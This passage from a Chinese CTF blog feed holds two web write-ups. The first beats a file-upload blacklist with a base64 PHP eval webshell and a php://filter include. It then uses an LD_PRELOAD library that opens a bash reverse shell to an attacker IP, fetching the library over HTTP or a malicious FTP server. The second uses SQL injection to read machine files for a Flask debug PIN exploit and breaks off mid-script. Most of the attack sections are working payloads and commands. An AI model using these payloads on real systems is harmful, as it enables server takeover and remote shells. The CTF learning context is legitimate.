close|zip_entry_read|zip_entry_filesize|zip_entry_name|zip_entry_compressedsize|zip_entry_compressionmethod|opcache_reset|opcache_invalidate|opcache_compile_file|opcache_is_script_cached|opcache_get_configuration|opcache_get_status/i&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;  <span class="hljs-comment">//正则</span><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br><br>&#125;<br><br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">大概能用的</span><br><span class="hljs-comment">  string(13) &quot;base64_decode&quot;</span><br><span class="hljs-comment">  [386]=&gt;</span><br><span class="hljs-comment">  string(13) &quot;base64_encode&quot;</span><br><span class="hljs-comment">  [440]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;putenv&quot;</span><br><span class="hljs-comment">  [475]=&gt;</span><br><span class="hljs-comment">  string(11) &quot;show_source&quot;</span><br><span class="hljs-comment">  string(6) &quot;define&quot;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>接下来读源码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">show<span class="hljs-constructor">_source(&#x27;..<span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>&#x27;)</span>; 被ban 大小写变换 =&gt; <span class="hljs-constructor">Show_source(&#x27;..<span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>&#x27;)</span>;<br></code></pre></td></tr></table></figure><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">light</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">glow</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">form</span> <span class="hljs-title">enctype</span>=&quot;<span class="hljs-title">multipart</span>/<span class="hljs-title">form</span>-<span class="hljs-title">data</span>&quot; <span class="hljs-title">method</span>=&quot;<span class="hljs-title">post</span>&quot; <span class="hljs-title">onsubmit</span>=&quot;<span class="hljs-title">return</span> <span class="hljs-title">checkFile</span>()&quot;&gt;</span><br><span class="hljs-class">    嘿伙计，传个火？！</span><br><span class="hljs-class">    &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">input_file</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">upload_file</span>&quot;/&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">button</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">upload</span>&quot;/&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">span</span>&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">flare</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">fun</span>($<span class="hljs-title">var</span>): <span class="hljs-title">bool</span></span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&quot;\$_&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;copy&quot;</span> ,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;usort&quot;</span>,<span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwriter&quot;</span>,<span class="hljs-string">&quot;fput&quot;</span>,<span class="hljs-string">&quot;copy&quot;</span>,<span class="hljs-string">&quot;curl&quot;</span>,<span class="hljs-string">&quot;fread&quot;</span>,<span class="hljs-string">&quot;fget&quot;</span>,<span class="hljs-string">&quot;function_exists&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;putenv&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;proc_close&quot;</span>, <span class="hljs-string">&quot;proc_get_status&quot;</span>,<span class="hljs-string">&quot;checkdnsrr&quot;</span>,<span class="hljs-string">&quot;getmxrr&quot;</span>,<span class="hljs-string">&quot;getservbyname&quot;</span>,<span class="hljs-string">&quot;getservbyport&quot;</span>, <span class="hljs-string">&quot;syslog&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;highlight_file&quot;</span>,<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;chmod&quot;</span>];<br><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackword</span>)&#123;<br>        <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$var</span>, <span class="hljs-variable">$blackword</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br>&#125;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br>define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;./uploads&quot;</span>);<br><span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Upload Success!&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, strtolower(<span class="hljs-variable">$ext</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;只要好看的php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$temp_file</span>);<br><span class="hljs-keyword">if</span>(fun(<span class="hljs-variable">$content</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;诶，被我发现了吧&quot;</span>);<br>&#125;<br><span class="hljs-variable">$new_file_name</span> = md5(<span class="hljs-variable">$file_name</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$new_file_name</span>;<br><br><br>        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Upload Failed!&#x27;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="hljs-variable">$msg</span>.<span class="hljs-string">&quot; Look here~ &quot;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码的问题在于这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackword</span>)&#123;<br>        <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$var</span>, <span class="hljs-variable">$blackword</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;  <span class="hljs-comment">//该函数区分大小写</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>所以可以通过大小写变换绕过 strstr &#x3D;&gt; stristr 可以解决这个问题</p><h3 id="解法1-利用php原生类写入文件"><a href="#解法1-利用php原生类写入文件" class="headerlink" title="解法1-利用php原生类写入文件"></a>解法1-利用php原生类写入文件</h3><p>传一个一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//base64编码绕过检测</span><br>           ↓<br>PD9waHAgDQoJQGV2YWwoJF9QT1NUWycxJ10pOw0KPz4=<br>    <span class="hljs-comment">// ./uploads/f3b94e88bd1bd325af6f62828c8785dd.php</span><br></code></pre></td></tr></table></figure><p>之后使用伪协议进行触发 先对伪协议内容进行编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.base64-decode/resource=./f3b94e88bd1bd325af6f62828c8785dd.php</span><br>↓<br>cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0uL2YzYjk0ZTg4YmQxYmQzMjVhZjZmNjI4MjhjODc4NWRkLnBocA==<br></code></pre></td></tr></table></figure><p>之后使用伪协议进行文件包含 触发 这个shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">Include</span>(base64_decode(<span class="hljs-string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0uL2YzYjk0ZTg4YmQxYmQzMjVhZjZmNjI4MjhjODc4NWRkLnBocA==&quot;</span>));<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204252259128.png" alt="image-20220425225914915"></p><p>成功getshell 但是如果用蚁剑连会连接不上</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204252301646.png" alt="image-20220425230113507"></p><p>这是由于 蚁剑 连接时使用函数 如 <code>ini_set</code> 被ban </p><p>结合phpinfo的信息 这题提权至少可以利用 <code>LD_PRELOAD</code>,<code>iconv</code> 两种方式  如果你不是很懂bypass_disable function 来看 <a href="https://d3n13d.github.io/2022/04/13/PHP-bypass-disable-function%E4%B9%8B%E9%81%93/#LD-PRELOAD">传送门</a></p><p>这里我选择利用 ld_preload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">uid_t</span> <span class="hljs-title">getuid</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>生成 恶意so文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc hack.c -o hack.so -shared -fPIC<br></code></pre></td></tr></table></figure><p>来到刚刚有shell的地方  利用PHP原生类 进行文件写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://ip/hack.so&quot;</span>;<br><span class="hljs-comment">//$url = &quot;http://ip/gconv-modules&quot;;</span><br><br><span class="hljs-variable">$file1</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">while</span>(!<span class="hljs-variable">$file1</span>-&gt;eof())<br>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$file1</span>-&gt;fgets();<br>&#125;<br><span class="hljs-variable">$file2</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/tmp/hack.so&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br><span class="hljs-comment">//$file2 = new SplFileObject(&#x27;/tmp/gconv-modules&#x27;,&#x27;w&#x27;);</span><br><span class="hljs-variable">$file2</span>-&gt;fwrite(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204252324875.png" alt="image-20220425232454765"></p><p>触发这个so文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">1</span>=putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>//下面是 iconv的payload<br><span class="hljs-number">1</span>=putenv(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);include(&#x27;php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.iconv.<span class="hljs-built_in">exp</span>.UTF-<span class="hljs-number">8</span>/resource=/tmp/<span class="hljs-built_in">exp</span>.so&#x27;);<br><br></code></pre></td></tr></table></figure><p>拿到shell 会发现 权限不够…又有suid的配置问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /usr -user root -perm -4000 -print 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204252350328.png" alt="image-20220425235018149"></p><h3 id="解法2-利用恶意Ftp写入文件"><a href="#解法2-利用恶意Ftp写入文件" class="headerlink" title="解法2-利用恶意Ftp写入文件"></a>解法2-利用恶意Ftp写入文件</h3><p>从上面getshell之后使用</p><p>vps搭建ftp服务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer<br><span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> FTPHandler<br><span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer<br><br><br>authorizer = DummyAuthorizer()<br><br>authorizer.add_anonymous(<span class="hljs-string">&quot;./&quot;</span>)<br><br>handler = FTPHandler<br>handler.authorizer = authorizer<br><br>handler.masquerade_address = <span class="hljs-string">&quot;vpsip&quot;</span><br>handler.passive_ports = <span class="hljs-built_in">range</span>(<span class="hljs-number">9998</span>,<span class="hljs-number">10000</span>)<br><br>server = FTPServer((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">23</span>), handler)<br>server.serve_forever()<br></code></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-variable">$local_file</span> = <span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>;<br><span class="hljs-variable">$server_file</span> = <span class="hljs-string">&#x27;hack.so&#x27;</span>;<br><span class="hljs-variable">$ftp_server</span> = <span class="hljs-string">&#x27;vpsip&#x27;</span>;<br><span class="hljs-variable">$ftp_port</span>=<span class="hljs-number">23</span>;<br><br><span class="hljs-variable">$ftp</span> = ftp_connect(<span class="hljs-variable">$ftp_server</span>,<span class="hljs-variable">$ftp_port</span>);<br><br><br><span class="hljs-variable">$login_result</span> = ftp_login(<span class="hljs-variable">$ftp</span>, <span class="hljs-string">&#x27;anonymous&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>ftp_pasv(<span class="hljs-variable">$ftp</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">if</span> (ftp_get(<span class="hljs-variable">$ftp</span>, <span class="hljs-variable">$local_file</span>, <span class="hljs-variable">$server_file</span>, FTP_BINARY)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Successfully written to <span class="hljs-subst">$local_file</span>\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There was a problem\n&quot;</span>;<br>&#125;<br><br>ftp_close(<span class="hljs-variable">$ftp</span>);<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204261700487.png" alt="image-20220426170001257"></p><p>还是经典触发方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">1=putenv(&quot;LD_PRELOAD=/tmp/exp.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);<br></code></pre></td></tr></table></figure><p>先歇会儿…</p><p>参考链接：</p><p><a href="https://h4cking2thegate.github.io/2022/04/05/DASCTF2022-X-SU/">https://h4cking2thegate.github.io/2022/04/05/DASCTF2022-X-SU/</a></p><p><a href="https://blog.csdn.net/qq_53263789/article/details/123842691">https://blog.csdn.net/qq_53263789/article/details/123842691</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>从CTF题目学习Flask Debug模式pin码安全问题</title>
    <link href="/2022/04/20/%E4%BB%8ECTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0Flask-Debug%E6%A8%A1%E5%BC%8Fpin%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2022/04/20/%E4%BB%8ECTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0Flask-Debug%E6%A8%A1%E5%BC%8Fpin%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h2><p>原因是Flask 框架在开启 Debug模式时有一个Debugger PIN，正确输入这个PIN可以直接执行python代码</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204202256552.png" alt="image-20220420225606475"></p><p>然而 不同的python版本有不同的PIN码生成逻辑，这也意味着不同版本的exp不同</p><h2 id="CTF2022-web-oh-my-notepro"><a href="#CTF2022-web-oh-my-notepro" class="headerlink" title="*CTF2022-web-oh-my-notepro"></a>*CTF2022-web-oh-my-notepro</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204202328796.png" alt="image-20220420232806732"></p><p>发现存在 sql注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs gauss">/<span class="hljs-built_in">view</span>?note_id=<span class="hljs-number">1</span>sxkcg1dhtssoehmsgfo77hf1n517qazb&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204202012622.png" alt="image-20220420201241554"></p><p>获取 库 ，表</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">view</span>?note_id=<span class="hljs-number">1</span>sxkcg<span class="hljs-number">1</span>dhtssoehmsgfo<span class="hljs-number">77</span>hf<span class="hljs-number">1</span>n<span class="hljs-number">517</span>qazb&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(schema_name) from information_schema.schemata;%<span class="hljs-number">23</span><br><span class="hljs-attribute">1sxkcg1dhtssoehmsgfo77hf1n517qazb</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204202032717.png" alt="image-20220420203219663"></p><center>user是自建表</center><p>已知题目使用Flask框架，猜测是要算pin码，读取几个关键文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">view</span>?note_id=sxkcg1dhtssoehmsgfo77hf1n517qazb%<span class="hljs-number">27</span>;<span class="hljs-keyword">create</span>%<span class="hljs-number">20</span><span class="hljs-keyword">table</span>%<span class="hljs-number">20</span><span class="hljs-keyword">user</span>(cmd%<span class="hljs-number">20</span>text);%<span class="hljs-number">23</span>  #建表<br>/<span class="hljs-keyword">view</span>?note_id=sxkcg1dhtssoehmsgfo77hf1n517qazb%<span class="hljs-number">27</span>;<span class="hljs-keyword">load</span>+data+<span class="hljs-keyword">local</span>+infile+%<span class="hljs-number">27</span>/etc/machine-id%<span class="hljs-number">27</span>+<span class="hljs-keyword">into</span>+<span class="hljs-keyword">table</span>+<span class="hljs-keyword">user</span>;%<span class="hljs-number">23</span> #插数据<br>/<span class="hljs-keyword">view</span>?note_id=sxkcg1dhtssoehmsgfo77hf1n517qazb%<span class="hljs-number">27</span>;<span class="hljs-keyword">load</span>+data+<span class="hljs-keyword">local</span>+infile+%<span class="hljs-number">27</span>/proc/self/cgroup%<span class="hljs-number">27</span>+<span class="hljs-keyword">into</span>+<span class="hljs-keyword">table</span>+<span class="hljs-keyword">user</span>;%<span class="hljs-number">23</span><br>/<span class="hljs-keyword">view</span>?note_id=sxkcg1dhtssoehmsgfo77hf1n517qazb%<span class="hljs-number">27</span>;<span class="hljs-keyword">load</span>+data+<span class="hljs-keyword">local</span>+infile+%<span class="hljs-number">27</span>/sys/<span class="hljs-keyword">class</span>/net/eth0/address%<span class="hljs-number">27</span>+<span class="hljs-keyword">into</span>+<span class="hljs-keyword">table</span>+<span class="hljs-keyword">user</span>;%<span class="hljs-number">23</span><br>/<span class="hljs-keyword">view</span>?note_id=<span class="hljs-number">1</span>sxkcg1dhtssoehmsgfo77hf1n517qazb<span class="hljs-string">&#x27; union select 1,1,1,1,group_concat(cmd) from ctf.user%23  #查数据</span><br></code></pre></td></tr></table></figure><p>现在得到了 &#x2F;etc&#x2F;machine-id、&#x2F;proc&#x2F;self&#x2F;cgroup、&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>关于ip地址的转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">eth0=<span class="hljs-string">&#x27;02:42:ac:14:00:03&#x27;</span><br>eth0 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(eth0.replace(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),<span class="hljs-number">16</span>))<br><span class="hljs-built_in">print</span>(eth0)<br></code></pre></td></tr></table></figure><p>最终exp 对应Python 3.8版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 